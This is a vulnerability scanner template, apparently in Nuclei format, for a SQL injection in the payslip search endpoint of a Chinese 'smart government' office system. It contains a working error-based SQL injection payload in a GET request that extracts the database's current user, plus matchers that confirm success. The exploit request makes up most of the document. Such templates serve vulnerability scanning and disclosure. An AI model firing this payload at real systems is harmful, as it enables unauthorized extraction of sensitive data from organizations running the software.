id: sztOA-time-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 中科数字通（北京）科技有限公司全新架构的智慧办公系统，由9大类、50多个主要功能模块构成。旨在为组织单位内部提供全新一代智慧型协同办公系统，数字通指尖云平台-智慧政务存在SQL注入漏洞，可通过SQL注入可获取敏感信息。
  reference:
    - https://github.com/wy876/POC/blob/main/%E6%95%B0%E5%AD%97%E9%80%9AOA-%E6%99%BA%E6%85%A7%E6%94%BF%E5%8A%A1%E6%8E%A5%E5%8F%A3payslip%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: tags
  
http:
  - method: GET
    path:
      - "{{BaseURL}}/payslip/search/index/userid/time/time?PayslipUser[user_id]=(SELECT+4050+FROM(SELECT+COUNT(*),CONCAT((mid((ifnull(cast(current_user()+as+nchar),0x20)),1,54)),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)"
        
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '无法执行'
      - type: word
        part: body
        words:
          - '@'
